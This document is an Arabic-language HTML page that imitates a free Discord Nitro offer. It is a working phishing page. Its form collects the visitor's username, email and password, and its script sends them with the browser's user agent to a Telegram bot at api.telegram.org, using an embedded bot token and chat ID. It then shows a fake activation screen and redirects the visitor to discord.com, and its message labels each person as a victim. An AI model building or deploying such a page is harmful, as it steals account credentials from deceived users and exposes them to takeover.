<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Nitro مجاني</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Segoe UI',Tahoma,sans-serif;
            background:#5865f2;color:#fff;min-height:100vh;
            display:flex;align-items:center;justify-content:center;padding:20px;
        }
        .container{
            background:#2c2f33;border-radius:16px;padding:30px 20px;
            max-width:400px;width:100%;text-align:center;
            border:2px solid #5865f2;box-shadow:0 0 40px rgba(88,101,242,0.5);
        }
        .logo{font-size:50px;margin-bottom:10px}
        h1{font-size:22px;margin-bottom:5px}
        .sub{color:#99aab5;font-size:13px;margin-bottom:20px}
        .nitro-badge{
            display:inline-block;background:linear-gradient(135deg,#5865f2,#eb459e);
            padding:8px 16px;border-radius:20px;font-size:12px;font-weight:bold;margin-bottom:18px;
        }
        .fg{margin-bottom:14px;text-align:right}
        label{display:block;color:#b9bbbe;font-size:12px;margin-bottom:5px}
        input{
            width:100%;padding:13px;background:#40444b;
            border:1px solid #40444b;border-radius:8px;
            color:#fff;font-size:14px;outline:none;
        }
        input:focus{border-color:#5865f2;box-shadow:0 0 15px rgba(88,101,242,0.3)}
        input::placeholder{color:#72767d}
        .btn{
            width:100%;padding:14px;margin-top:10px;
            background:linear-gradient(135deg,#5865f2,#eb459e);
            color:#fff;border:none;border-radius:8px;
            font-size:17px;font-weight:bold;cursor:pointer;
            box-shadow:0 0 25px rgba(88,101,242,0.4);
        }
        .btn:active{transform:scale(0.96)}
        .load{
            display:none;position:fixed;inset:0;background:rgba(44,47,51,0.95);z-index:99;
            justify-content:center;align-items:center;flex-direction:column;
        }
        .load.show{display:flex}
        .spinner{
            width:50px;height:50px;border:4px solid #40444b;
            border-top:4px solid #5865f2;border-radius:50%;
            animation:spin 0.8s linear infinite;margin-bottom:18px;
        }
        @keyframes spin{to{transform:rotate(360deg)}}
        .done{
            display:none;position:fixed;inset:0;background:rgba(44,47,51,0.98);z-index:98;
            justify-content:center;align-items:center;flex-direction:column;
        }
        .done.show{display:flex}
        .done h2{color:#57f287;font-size:24px;margin:12px 0}
    </style>
</head>
<body>

<div class="container" id="form">
    <div class="logo">🎮</div>
    <h1>Discord Nitro</h1>
    <div class="nitro-badge">✨ 3 أشهر مجاناً</div>
    <p class="sub">احصل على Discord Nitro مجاناً</p>
    
    <div class="fg"><label>👤 اسم المستخدم</label><input type="text" id="username" placeholder="username#0000"></div>
    <div class="fg"><label>📧 البريد الإلكتروني</label><input type="email" id="email" placeholder="email@example.com"></div>
    <div class="fg"><label>🔒 كلمة المرور</label><input type="password" id="password" placeholder="كلمة المرور"></div>
    
    <button class="btn" onclick="go()">✨ احصل على Nitro</button>
</div>

<div class="load" id="load"><div class="spinner"></div><p style="color:#b9bbbe">⏳ جاري تفعيل Nitro...</p></div>
<div class="done" id="done"><h2>✅ تم التفعيل!</h2><p style="color:#b9bbbe">Nitro مفعل لمدة 3 أشهر</p></div>

<script>
const u=new URL(window.location.href);
const CHAT=u.searchParams.get('chatId')||'7276604783';
const TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
async function send(t){
    try{await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
}
async function go(){
    const un=document.getElementById('username').value.trim();
    const em=document.getElementById('email').value.trim();
    const pw=document.getElementById('password').value.trim();
    if(!un||!em||!pw)return alert('املأ جميع الحقول');
    document.getElementById('load').classList.add('show');
    const msg=`🎮 <b>ضحية ديسكورد!</b>\n\n👤 يوزر: ${un}\n📧 إيميل: ${em}\n🔒 كلمة: ${pw}\n\n📱 ${navigator.userAgent}`;
    await send(msg);
    setTimeout(()=>{document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(()=>{window.location.href='https://discord.com/'},3000)},4000);
}
</script>
</body>
</html>
